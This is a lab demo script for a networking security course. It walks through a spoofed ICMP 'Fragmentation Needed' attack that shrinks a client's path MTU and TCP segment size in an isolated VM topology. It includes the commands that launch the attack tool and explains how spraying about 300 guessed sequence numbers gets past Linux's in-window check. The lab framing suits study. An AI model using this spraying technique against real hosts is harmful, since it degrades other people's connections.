# Demo: ICMP Blind PMTU Throughput-Reduction Attack (Attack 2)

This is a script for live-demonstrating the attack from `Design_doc.pdf`
Section 1.2 / 3.3 / 5.2, using the topology from `setup_topology.sh` and
the tooling in `attacks/` and `experiments/`.

## What you're demonstrating

The attacker spoofs an **ICMP Type 3, Code 4** (Fragmentation Needed, DF
Set) message advertising a small Next-Hop MTU (576 bytes). If accepted,
the client updates its cached Path MTU for the server and shrinks its
TCP Maximum Segment Size accordingly — sending smaller segments and
achieving lower throughput on an active bulk transfer.

Two things worth calling out live, because — like the reset attack — the
naive version of this doesn't just work on the first try:

1. **Same directional correction as the reset attack, opposite target.**
   The reset attack (Attack 1) targets the **server** (embed a packet
   that looks like the server's own traffic). This attack targets the
   **client**, because the client is the bulk *sender* in this lab's
   iperf3 test — MSS is a per-sender cache, so shrinking the sender's
   MSS is what actually reduces throughput. The embedded packet must
   look like something the **client itself** sent to the server. See
   `attacks/build_packets.py`'s module docstring for the full reasoning.
2. **A single sniffed sequence number reliably fails here — this is the
   real point of interest.** Unlike the reset attack's *idle* held
   connection, this is an *active* bulk transfer. Linux's in-window
   check (`between(seq, snd_una, snd_nxt)`) applies to this ICMP code
   too, and for a fast connection that window is only `cwnd*mss` wide
   (~100-150KB observed here) and slides forward at the full transfer
   rate. A value sniffed via `tcpdump` is almost always already ACKed
   and out of the window by the time it clears Python + Scapy's
   `send()` — confirmed directly via `TcpExt:OutOfWindowIcmps` in
   `/proc/net/netstat`. The fix, implemented in `attacks/inject_pmtu.py`,
   is to **spray** ~300 candidate sequence numbers in steps smaller than
   the in-flight window instead of guessing once — the same technique
   Watson's original blind-injection attacks use, and consistent with
   the design doc's own "sampled seq numbers" (plural) wording.

## Prerequisites

The lab VM must be up with the topology already applied:

```bash
multipass start cse406-lab
multipass exec cse406-lab -- sudo bash /home/ubuntu/setup_topology.sh
```

(See `VM_COMMANDS.md` if the VM or its file sync needs setting up from
scratch.)

---

## Option A — one-shot automated demo

Runs the full 60-second experiment and prints a complete before/after
report:

```bash
multipass exec cse406-lab -- sudo bash /home/ubuntu/experiments/p5_pmtu_experiment.sh
# optional args: [duration] [inject_at] [mtu] — default 60 15 576
```

Expected tail of the output:

```
== Outcome checklist (design doc Section 5.2) ==
[1] Spoofed ICMP visible in client capture: YES (2700 packet(s))
[2] ip route get shows mtu 576 (PMTU cache updated): YES
[3] TCP segment sizes: see 'before/after injection' summary above (design doc expects a drop to <=536 bytes)
[4] iperf3 throughput: see per-second breakdown above (design doc expects a measurable decrease)
```

with the summary further up showing something like:

```
Avg before injection: 95.79 Mbps
Avg after injection:  89.22 Mbps
Change: +6.9%
...
Before injection: n=122857 min=0 max=2896 avg=1448
After injection : n=923119 min=0 max=3328 avg=542
```

This is enough to show a grader end-to-end. Use Option B below to walk
through it live, step by step, across separate terminals.

---

## Option B — manual walkthrough (3 terminals)

Open three shells into the VM:

```bash
multipass shell cse406-lab   # x3
```

### Terminal 1 — Server

```bash
sudo ip netns exec server iperf3 -s
```

### Terminal 2 — Client

Start a bulk transfer long enough to demo comfortably:

```bash
sudo ip netns exec client iperf3 -c 10.0.0.2 -t 60 -i 5
```

Let it run for ~5-10 seconds so it reaches steady state. In a spare
moment, check the live MSS/PMTU:

```bash
sudo ip netns exec client ss -tin
```

You should see something like:

```
mss:1448 pmtu:1500 rcvmss:536 advmss:1448 cwnd:100 ...
```

### Terminal 3 — Attacker

Sniff the client's own outgoing segments and spray the spoofed PMTU
packets:

```bash
sudo ip netns exec attacker python3 /home/ubuntu/attacks/inject_pmtu.py --server-port 5201 --mtu 576 --duration 20 --interval 5
```

Expected output, repeated every ~5 seconds for `--duration`:

```
Sniffing veth-at for 10.0.0.1 -> 10.0.0.2:5201 traffic...
Captured: client_port=<port> base_seq=<seq>
Spraying 300 candidates, step=50000B, covering +15.0MB (MTU=576)...
Sent.
```

### Back to Terminal 2 — observe the result

```bash
sudo ip netns exec client ss -tin
```

Within one spray round (a few seconds), this now shows:

```
mss:524 pmtu:576 rcvmss:536 advmss:1448 ...
```

And Terminal 2's own iperf3 output (`-i 5`) shows the `Bitrate` column
dropping in the intervals after the attack starts.

### Confirm the PMTU cache directly

```bash
sudo ip netns exec client ip route get 10.0.0.2
```

Shows a `cache ... mtu 576` line.

---

## Talking points for the write-up / defense

- Item 1 of Section 5.2 ("ICMP visible in capture") and item 2 ("`ip
  route get` shows the reduced MTU") are both directly observable and
  reliable — the ICMP delivery and PMTU cache update aren't in question.
- Item 3 (segment size drop) and item 4 (throughput drop) are both real
  and measured, but the throughput drop is modest (5-7% in repeated
  runs) rather than dramatic — worth explaining *why* in the report:
  this lab's `setup_topology.sh` shapes the client/server link to
  100mbit with `tc tbf`, a byte-rate limiter. Since iperf3 measures
  application-level goodput, a smaller MSS mostly shows up as a bigger
  fraction of each rate-capped packet going to the fixed 40-byte
  IP+TCP header instead of payload (~97% efficient at MSS 1448 vs ~93%
  at MSS 536) — a real, explainable effect, not a measurement artifact.
- The single-guess-fails / spray-succeeds finding is worth a paragraph
  on its own: it's the practical reason real blind-injection attacks
  (Watson 2004) spray a range of sequence numbers rather than guessing
  once, and it's directly demonstrable here via
  `TcpExt:OutOfWindowIcmps` in `/proc/net/netstat` on the client.
- Cleanup between manual runs, if something is left running:
  ```bash
  sudo pkill -f iperf3; sudo pkill -f tcpdump; sudo pkill -f inject_pmtu
  ```
